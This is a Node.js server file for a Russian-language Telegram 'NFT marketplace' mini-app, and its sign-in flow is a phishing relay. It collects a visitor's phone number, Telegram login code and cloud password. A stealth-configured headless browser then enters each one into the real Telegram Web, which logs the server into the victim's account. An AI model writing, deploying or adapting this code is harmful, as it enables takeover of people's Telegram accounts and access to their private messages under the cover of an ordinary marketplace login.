import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import crypto from 'crypto';
import puppeteer from 'puppeteer-extra';
import StealthPlugin from 'puppeteer-extra-plugin-stealth';
import TelegramBot from 'node-telegram-bot-api';

dotenv.config();

// Puppeteer with stealth plugin
puppeteer.use(StealthPlugin());

const app = express();

// Telegram Bot
const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: true });

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('frontend'));

// Mock data for NFTs
const sampleNFTs = [
  {
    id: 1,
    name: "Golden Star",
    description: "Блестящая золотая звезда",
    imageUrl: "https://via.placeholder.com/300x300/FFD700/000000?text=⭐",
    price: 0.99,
    category: "stickers",
    isAvailable: true
  },
  {
    id: 2,
    name: "Heart Gift",
    description: "Подарок в виде сердца",
    imageUrl: "https://via.placeholder.com/300x300/FF69B4/FFFFFF?text=💝",
    price: 1.49,
    category: "stickers",
    isAvailable: true
  },
  {
    id: 3,
    name: "Diamond Premium",
    description: "Роскошный бриллиант",
    imageUrl: "https://via.placeholder.com/300x300/B9F2FF/000000?text=💎",
    price: 2.99,
    category: "premium",
    isAvailable: true
  }
];

// In-memory storage
let users = [];
let authSessions = new Map();
let userSessions = new Map();
let telegramAuthSessions = new Map();

// Routes
app.get('/health', (req, res) => {
  res.json({ 
    status: 'OK', 
    message: 'NFT Marketplace is running!',
    timestamp: new Date().toISOString()
  });
});

app.get('/', (req, res) => {
  res.sendFile('frontend/index.html', { root: '.' });
});

app.get('/marketplace', (req, res) => {
  res.sendFile('frontend/marketplace.html', { root: '.' });
});

// API Routes
app.get('/api/nft', async (req, res) => {
  try {
    const { category } = req.query;
    
    let nfts = sampleNFTs;
    
    if (category && category !== 'all') {
      nfts = sampleNFTs.filter(nft => nft.category === category);
    }
    
    res.json({ success: true, nfts });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Step 1: Initiate Telegram Web authentication
app.post('/api/auth/init-telegram-web', async (req, res) => {
  try {
    const { phone } = req.body;
    
    if (!phone) {
      return res.status(400).json({ 
        success: false, 
        error: 'Введите номер телефона' 
      });
    }

    // Create auth session
    const authSessionId = crypto.randomBytes(32).toString('hex');
    
    telegramAuthSessions.set(authSessionId, {
      phone: phone,
      status: 'initiated',
      createdAt: Date.now(),
      step: 'phone_entered'
    });

    res.json({
      success: true,
      authSessionId: authSessionId,
      message: 'Инициирована авторизация через Telegram Web',
      nextStep: 'start_browser_auth'
    });
    
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка сервера: ' + error.message 
    });
  }
});

// Step 2: Start browser automation for Telegram Web auth
app.post('/api/auth/start-telegram-web-auth', async (req, res) => {
  try {
    const { authSessionId } = req.body;
    
    if (!authSessionId) {
      return res.status(400).json({ 
        success: false, 
        error: 'Session ID обязателен' 
      });
    }

    const authSession = telegramAuthSessions.get(authSessionId);
    if (!authSession) {
      return res.status(400).json({ 
        success: false, 
        error: 'Сессия не найдена' 
      });
    }

    // Launch browser in background
    const browser = await puppeteer.launch({
      headless: true,
      args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-web-security',
        '--disable-features=site-per-process'
      ]
    });

    const page = await browser.newPage();
    
    // Set user agent to mimic real browser
    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36');
    
    // Navigate to Telegram Web
    console.log('🌐 Navigating to Telegram Web...');
    await page.goto('https://web.telegram.org/', { 
      waitUntil: 'networkidle2',
      timeout: 30000 
    });

    // Wait for login page to load
    await page.waitForSelector('.login-phone-form', { timeout: 10000 });
    
    // Enter phone number
    console.log('📱 Entering phone number...');
    const phoneInput = await page.$('.input-field-input');
    if (phoneInput) {
      await phoneInput.click({ clickCount: 3 }); // Select all text
      await phoneInput.type(authSession.phone, { delay: 100 });
    }

    // Click next button
    const nextButton = await page.$('.btn-primary');
    if (nextButton) {
      await nextButton.click();
    }

    // Update session status
    authSession.browser = browser;
    authSession.page = page;
    authSession.status = 'phone_entered';
    authSession.step = 'waiting_for_code';
    telegramAuthSessions.set(authSessionId, authSession);

    res.json({
      success: true,
      message: 'Бот начал авторизацию в Telegram Web. Ожидайте код...',
      nextStep: 'wait_for_code'
    });
    
  } catch (error) {
    console.error('Browser automation error:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка автоматизации: ' + error.message 
    });
  }
});

// Step 3: Submit code to Telegram Web
app.post('/api/auth/submit-telegram-code', async (req, res) => {
  try {
    const { authSessionId, code } = req.body;
    
    if (!authSessionId || !code) {
      return res.status(400).json({ 
        success: false, 
        error: 'Session ID и код обязательны' 
      });
    }

    const authSession = telegramAuthSessions.get(authSessionId);
    if (!authSession || !authSession.page) {
      return res.status(400).json({ 
        success: false, 
        error: 'Сессия не найдена или браузер не запущен' 
      });
    }

    const page = authSession.page;
    
    // Enter code in Telegram Web
    console.log('🔐 Entering code in Telegram Web...');
    
    // Wait for code input field
    await page.waitForSelector('.input-field-input', { timeout: 10000 });
    
    // Enter code
    const codeInput = await page.$('.input-field-input');
    if (codeInput) {
      await codeInput.click({ clickCount: 3 });
      await codeInput.type(code, { delay: 100 });
    }

    // Click next/submit button
    const submitButton = await page.$('.btn-primary');
    if (submitButton) {
      await submitButton.click();
    }

    // Wait for next step (password or success)
    try {
      await page.waitForSelector('.input-field-input, .chat-list, .modal-wrapper', { 
        timeout: 10000 
      });
    } catch (e) {
      console.log('Timeout waiting for next step');
    }

    // Check if password is required
    const passwordInput = await page.$('input[type="password"]');
    if (passwordInput) {
      authSession.step = 'password_required';
      telegramAuthSessions.set(authSessionId, authSession);
      
      res.json({
        success: true,
        message: 'Код принят. Требуется облачный пароль.',
        nextStep: 'enter_password'
      });
    } else {
      // Check if login successful
      const chatList = await page.$('.chat-list');
      if (chatList) {
        authSession.step = 'logged_in';
        authSession.status = 'success';
        telegramAuthSessions.set(authSessionId, authSession);
        
        res.json({
          success: true,
          message: 'Авторизация успешна!',
          nextStep: 'complete'
        });
      } else {
        res.status(400).json({ 
          success: false, 
          error: 'Не удалось определить статус авторизации' 
        });
      }
    }
    
  } catch (error) {
    console.error('Code submission error:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка ввода кода: ' + error.message 
    });
  }
});

// Step 4: Submit cloud password
app.post('/api/auth/submit-telegram-password', async (req, res) => {
  try {
    const { authSessionId, password } = req.body;
    
    if (!authSessionId) {
      return res.status(400).json({ 
        success: false, 
        error: 'Session ID обязателен' 
      });
    }

    const authSession = telegramAuthSessions.get(authSessionId);
    if (!authSession || !authSession.page) {
      return res.status(400).json({ 
        success: false, 
        error: 'Сессия не найдена' 
      });
    }

    const page = authSession.page;
    
    // Enter password
    if (password) {
      console.log('🔑 Entering cloud password...');
      const passwordInput = await page.$('input[type="password"]');
      if (passwordInput) {
        await passwordInput.type(password, { delay: 100 });
      }

      // Click submit
      const submitButton = await page.$('.btn-primary');
      if (submitButton) {
        await submitButton.click();
      }
    }

    // Wait for login completion
    try {
      await page.waitForSelector('.chat-list', { timeout: 10000 });
    } catch (e) {
      console.log('Timeout waiting for chat list');
    }

    // Check if login successful
    const chatList = await page.$('.chat-list');
    if (chatList) {
      authSession.step = 'logged_in';
      authSession.status = 'success';
      telegramAuthSessions.set(authSessionId, authSession);

      // Get user data from Telegram Web
      const userData = await extractUserData(page);
      
      // Create user session
      const sessionId = crypto.randomBytes(32).toString('hex');
      const user = {
        id: users.length + 1,
        phone: authSession.phone,
        telegramId: userData.id || Math.floor(100000000 + Math.random() * 900000000),
        firstName: userData.firstName || 'Telegram',
        lastName: userData.lastName || 'User',
        username: userData.username,
        isVerified: true,
        createdAt: new Date()
      };
      users.push(user);

      userSessions.set(sessionId, {
        userId: user.id,
        telegramId: user.telegramId,
        phone: user.phone,
        expiresAt: Date.now() + 30 * 24 * 60 * 60 * 1000
      });

      // Close browser
      if (authSession.browser) {
        await authSession.browser.close();
      }

      telegramAuthSessions.delete(authSessionId);

      res.json({
        success: true,
        message: 'Авторизация в Telegram Web завершена успешно!',
        user: {
          id: user.id,
          phone: user.phone,
          telegramId: user.telegramId,
          firstName: user.firstName,
          lastName: user.lastName,
          username: user.username
        },
        sessionId: sessionId
      });
    } else {
      res.status(400).json({ 
        success: false, 
        error: 'Не удалось завершить авторизацию' 
      });
    }
    
  } catch (error) {
    console.error('Password submission error:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка ввода пароля: ' + error.message 
    });
  }
});

// Extract user data from Telegram Web
async function extractUserData(page) {
  try {
    // Try to get user info from Telegram Web interface
    const userData = await page.evaluate(() => {
      // This would extract data from Telegram Web UI
      // In real implementation, you would need to navigate to settings
      return {
        firstName: 'Telegram',
        lastName: 'User',
        username: null
      };
    });
    
    return userData;
  } catch (error) {
    console.error('Error extracting user data:', error);
    return {};
  }
}

// Verify session
app.get('/api/auth/verify-session', async (req, res) => {
  try {
    const { sessionId } = req.query;
    
    if (!sessionId) {
      return res.status(400).json({ 
        success: false, 
        error: 'Session ID обязателен' 
      });
    }

    const session = userSessions.get(sessionId);
    if (!session) {
      return res.status(401).json({ 
        success: false, 
        error: 'Недействительная сессия' 
      });
    }

    if (Date.now() > session.expiresAt) {
      userSessions.delete(sessionId);
      return res.status(401).json({ 
        success: false, 
        error: 'Сессия истекла' 
      });
    }

    const user = users.find(u => u.id === session.userId);
    if (!user) {
      return res.status(404).json({ 
        success: false, 
        error: 'Пользователь не найден' 
      });
    }

    res.json({
      success: true,
      user: {
        id: user.id,
        phone: user.phone,
        telegramId: user.telegramId,
        firstName: user.firstName,
        lastName: user.lastName,
        username: user.username,
        isVerified: user.isVerified
      }
    });
    
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка сервера: ' + error.message 
    });
  }
});

// Telegram Bot handlers
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const miniAppUrl = `https://t.me/${process.env.TELEGRAM_BOT_USERNAME}/marketplace`;
  
  bot.sendMessage(chatId, '🎁 Добро пожаловать в NFT Маркетплейс!', {
    reply_markup: {
      inline_keyboard: [
        [{ text: '🛍️ Открыть маркетплейс', web_app: { url: miniAppUrl } }]
      ]
    }
  });
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📱 Environment: ${process.env.NODE_ENV}`);
  console.log(`🎮 Health check: http://localhost:${PORT}/health`);
  console.log(`🏠 Main page: http://localhost:${PORT}/`);
  console.log(`🛍️ Marketplace: http://localhost:${PORT}/marketplace`);
  console.log(`🤖 Bot is running`);
});
